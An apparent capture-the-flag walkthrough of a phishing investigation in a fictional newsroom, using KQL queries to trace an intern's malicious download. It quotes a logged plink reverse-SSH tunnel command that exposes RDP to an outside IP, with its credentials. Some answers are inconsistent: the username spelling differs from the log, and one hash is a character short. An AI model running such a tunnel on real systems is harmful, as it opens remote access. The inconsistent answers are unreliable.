## A Scandal in Valdoria: A Political Mystery<br>
### **Section 4**<br>
### **Summary**<br>
We can apply what we've learned by investigating the activity affecting Sonia to find other victims of this incident.
<br><br>
I hope you took good notes. Another suspicious email address valdorias_best_recruiter@gmail.com was seen sending emails to intern Ronnie and a few others.
<br><br>
**Q1 How many total emails were sent by this email sender to users at The Valdorian Times?**<br><br>

```
Email
| where sender == "valdorias_best_recruiter@gmail.com"
| count
```
<br>

**Answer: 18**<br><br>

**Q2 When did valdorias_best_recruiter@gmail.com send an email to Ronnie McLovin?**<br><br>

Can use the from and to email address in next query to find the timestamp.

```
Email
| where sender == "valdorias_best_recruiter@gmail.com"
| where recipient == "ronnie_mclovin@valdoriantimes.news"
```
<br>

**Answer: 1/10/2024, 8:48:16 AM**<br>

**Q3 What domain was in the link from that email?**<br><br>
From the previous query, the domain can be pulled from the link column. <br><br>

**Answer: promotionrecruit.org**<br><br>

**Q4 What was the subject of that email?**<br><br>
Using query from question 2, the subject line can be pulled from the column subject.<br><br>

**Answer: [EXTERNAL] Breaking News: We're Hiring! Apply Now for Reporter Roles**<br><br>


**Q5 When did Ronnie click on the link in the email from valdorias_best_recruiter@gmail.com ?**<br><br>
Search for the domain in the Outboundnetwork table. <br><br>

```
OutboundNetworkEvents
| where url has "promotionrecruit.org"
```
<br>

The first result shows when the link was clicked. Can cross reference this with the source IP address of 10.10.0.19, which is Ronnies user account.<br><br>

**Answer: 1/10/2024, 8:55:07 AM**<br><br>

**Q6 What was the name of the .docx file that was downloaded to Ronnie's machine?**<br><br>
From the query in question 5, the url for the first entry has the name of the docx file.<br>

**Answer: Editorial_J0b_Openings_2024.docx**<br><br>

**Q7 When was this docx file downloaded?**<br><br>
Search for files created after the link was clicked and with the user of Ronnie.<br><br>

```
FileCreationEvents
| where timestamp > datetime(1/10/2024 8:55:07)
| where username == "romclovin"
```
<br>

The first result that comes back shows the time when the file was downloaded.<br><br>

**Answer: 1/10/2024, 8:55:17 AM**<br><br>

**Q8 When was the .ps1 file dropped to Ronnie's machine?**<br><br>

The second result from the previous query shows the file created on Ronnies computer. In the path column it shows 'C:\ProgramData\hacktivist_manifesto.ps1'. <br>

**Answer: 1/10/2024, 8:55:51 AM**<br><br>

**Q9 What IP address was used with plink on Ronnie's machine?**<br><br>

First need to find the name of Ronnie's machine / computer and then pass that into the Process Events table looking for programs named plink.

```
let host=
Employees
| where name has "Ronnie McLovin"
|distinct hostname;
ProcessEvents
| where hostname in (host) and process_commandline has "plink"
```
<br>

Under the Process Commandline column the following information is shown.

```
plink.exe -R 3389:localhost:3389 -ssh -l $had0w -pw thruthW!llS3tUfree 168.57.191.100
```
<br>

The IP address is shown that was used with plink on Ronnie's machine.<br><br>

**Answer: 168.57.191.100**<br><br>

**Q10 What username was used with plink on Ronnie's machine?**<br><br>

From the previous query, the username is shown when connecting via SSH.<br><br>

**Answer: $hadow**<br><br>

**Q11 What password was used with plink on Ronnie's machine?**<br><br>

From they query in question 9, the password is shown.<br><br>

**Answer: thruthW!llS3tUfree**<br><br>

**Q12 How many discovery commands were run on Ronnie's machine?**
<br><br>
Referring back to question 8, the timestamp is when the .ps1 file was dropped. Can search for discovery commands that could have been run afterwards.

- A37A-DESKTOP - Ronnie's machine name
- timestamp - 01/10/2024 8:55:17
- cmd.exe - where the discovery commands would be run from
<br>

```
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where timestamp > datetime(01/10/2024 8:55:17)
| where process_name == "cmd.exe"
```
<br>
Same as question 25 from section 3. There are 5 discovery commands.<br><br>

**Answer: 5**<br><br>

**Q13 What is Ronnie's IP address?**<br><br>
Retrieve Ronnie's IP address from the Employees table.<br><br>

```
Employees
| where name has "Ronnie"
```
<br>

**Answer: 10.10.0.19**<br><br>

**Q14 What is the full URL fakestory.docx was downloaded from?**<br><br>

The name of the file is known and who downloaded it. Can use the file name and the IP address of Ronnie.<br><br>

```
OutboundNetworkEvents
| where url has "fakestory.docx"
| where src_ip == "10.10.0.19"
```
<br>
 In the url column is the answer. <br><br>
 
**Answer: https://hire-recruit.org/files/fakescandal/2024/fakestory.docx**<br><br>

**Q15 What is Ronnie's hostname?**<br><br>
From question 12.

**Answer: A37A-DESKTOP**<br><br>

**Q16 What is the sha256 hash of fakestory.docx on Ronnie's machine?**<br><br>

```
FileCreationEvents
| where hostname == "A37A-DESKTOP"
| where path has "fakestory.docx"
```
<br>

**Answer: 5f8a7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f**<br><br>

**Q17 When was fakestory.docx created on Ronnie's machine?**<br><br>
From previous query, the timestamp of the file creation can be retrieved.<br><br>

**Answer: 1/31/2024, 9:47:51 AM**<br><br>

**Q18 What is the new path for the document?**<br><br>
The file fakestory.docx timestamp of creation is known. Can search for processes after that timestamp with the file name.<br><br>

```
ProcessEvents
|where timestamp > datetime(1/31/2024, 9:47:51 AM)
| where process_commandline has "fakestory.docx"
```
<br>
Under the process command line coloumn.<br><br>

```
move C:\Users\romclovin\Downloads\fakestory.docx C:\Users\romclovin\Documents\OpEdFinal_to_print.docx
```
<br>


**Answer: C:\Users\romclovin\Documents\OpEdFinal_to_print.docx**<br><br>

**Q19 When was this command executed to rename and move the file?**<br><br>
From the previous query.<br><br>

**Answer: 1/31/2024, 10:26:20 AM**<br><br>

**Q20 When was OpEdFinal_to_print.docx emailed from Ronnie's account to Clark Kent?**<br><br>

```
Email
| where link has "OpEdFinal_to_print.docx"
```
<br>

**Answer: 1/31/2024, 11:11:12 AM**<br><br>


